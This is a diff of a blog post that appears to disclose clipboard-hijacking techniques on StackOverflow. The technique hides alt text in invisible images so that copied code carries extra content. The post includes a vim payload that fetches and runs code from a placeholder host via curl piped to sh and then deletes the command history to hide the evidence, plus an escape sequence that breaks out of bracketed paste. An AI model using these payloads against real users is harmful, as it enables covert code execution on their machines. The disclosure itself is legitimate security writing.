@@ -1,6 +1,6 @@
 ---
 layout: post
-title: Surprise functionality in StackOverflow copy-pasted code
+title: Clipboard subversion on StackOverflow
 ---
 Because Markdown is really a mixture of Markdown syntax and raw HTML to
 fill in gaps where Markdown can't do the job, having user-generated
@@ -13,16 +13,18 @@ switch to `<pre>` formatting without escaping all of the contained text
 as raw code; so you can embed HTML in the blocks which look like the
 code you would want to copy-paste, but with surprise semantics.
 
-You can embed images, for example, and provide alt text for those
-images, and you can make those images practically invisible, so that
-when people copy the text in the code block you provide they'll also
+The obvious thing is to put some text in a block marked invisible, but
+there are mitigations preventing that because that would be a sneaky
+thing to do.  Instead you can embed images, and provide alt text for
+those images, and you can make those images practically invisible,
+and when people copy the text in that code block they'll also
 pick up the alt text which they couldn't see on the web page.
 
 Like so:
 ```markdown
 Here is my solution:
 
-<pre>my<img src="https://example.com/invisible_image.gif" alt=" malicious"/> code</pre>
+<pre>my<img src="https://example.com/invisible_image.gif" alt=" malicious" /> code</pre>
 
 It's really good!
 ```
@@ -39,7 +41,7 @@ Stack Exchange.  More on that later.
 If you're clever then you might be able to drop in an extra character
 somewhere which has a profound effect on the meaning of the code.
 
-You can alse emulate non-printing keystrokes by sending their escape
+You can also emulate non-printing keystrokes by sending their escape
 sequences or control codes.  This leads applications to take actions
 based on those keystrokes rather than inserting them into an edit buffer
 as plain old text.
@@ -51,11 +53,11 @@ modify the text after it's been reviewed (replace an 8 with an &, for
 example).
 
 But those can be detected easily.  Something more nefarious would be to
-target a text editor.  For example I made a proof of concept targeting
-vim.  To maximise the chances that the user will be using vim when they
-paste your text you simply offer a swatch of text to be pasted into
-`~/.vimrc`, and if somebody wants to modify that file what editor do you
-think they're going to use?  Probably not emacs.
+target a text editor.  Let's take a crack at vim, for example.
+To maximise the chances that the user will be using vim when they
+paste your text try offering something to be pasted somewhere like
+`~/.vimrc`.  If somebody wants to modify that file what editor do you
+think they're going to use?  Typically not emacs.
 
 So if you know you're in vim you could embed something like an escape
 character, to enter command mode, and then some commands, like these
@@ -65,6 +67,13 @@ ones:
 :call system('(curl -s https://example.com/evilcode|sh)&')
 :call histdel('cmd','evilcode')
 ```
+
+The first executes a shell to get curl to download some code and run it;
+and it does so in the background rather than waiting for it to finish.
+The second deletes every history entry containing `evilcode`, so it
+deletes evidence of our malicious act and, conveniently, it deletes
+itself as well.
+
 After that drop back into insert mode and keep adding plausible text to
 the file to clear the status line of the result of the last command.
 
@@ -74,14 +83,8 @@ that the drawing and redrawing of a multi-line command buffer will be
 visible to the user, if only in a brief flash which might attract
 unwanted attention.
 
-The first executes a shell to get curl to download some code and run it;
-and it does so in the background rather than waiting for it to finish.
-The second deletes every history entry containing `evilcode`, so it
-deletes evidence of our malicious act and, conveniently, it deletes
-itself as well.
-
-There we go.  Running arbitrary code on a user's computer already.  What
-fun!
+And tere we go.  Running arbitrary code on a random SO user's computer,
+and they can't see us doing it!  What fun!
 
 Would I be telling you this if it was really so easy?  No.  OK, maybe.
 But it's not.
@@ -98,11 +101,10 @@ input again -- just like before bracketed paste was a thing.
 
 Like so:
 ```html
-<img alt="&#27;[201~ keyboard input here" ...>
+<img ... alt="&#27;[201~ keyboard input here" />
 ```
 
-Thankfully a lot of terminals (and after a few months of proking and
-prodding developers, a few more terminals) strip out some control codes
+Thankfully a lot of terminals (and after a few months of prodding developers, a few more terminals) strip out some control codes
 from pasted text, and this breaks the ability to embed the codes
 necessary to escape bracketed paste mode this way.
 
@@ -113,7 +115,7 @@ way or other.
 
 I can't promise that all terminals are filtering correctly, though.
 
-There's yet another potential weakness, though.  If you can get an
+But of course there's yet another potential weakness.  If you can get an
 incomplete escape sequence sent then the application can be tricked into
 _missing_ the begin-bracketed-paste escape sequence.  To illustrate this
 you can simply hit Escape right before pasting something into the
@@ -155,6 +157,15 @@ to me, but it's also industry standard and an evergrowing problem as
 people design more systems which function this way.  It's become
 normalised and there's no stopping it anymore.
 
+The other thing that frustrates me about reporting
+vulnerabilities is when they're only superficially addressed.
+Just enough to stop me digging any deeper.
+When the front door is open you can make a case for security in depth
+by pointing out consequential weaknesses behind the door and asking for them all
+to be fixed, but too often the reaction is to just close the
+door.  What happens when somebody else finds an open window?
+
+Maybe by the time you read this the ability to embed image alt text will have been superficially addressed and you'll have to look for an open window.  Good luck!
 
 [bracketed paste]: <https://en.wikipedia.org/wiki/Bracketed-paste>
 [sandbox]: <https://meta.stackexchange.com/q/3122/227423>
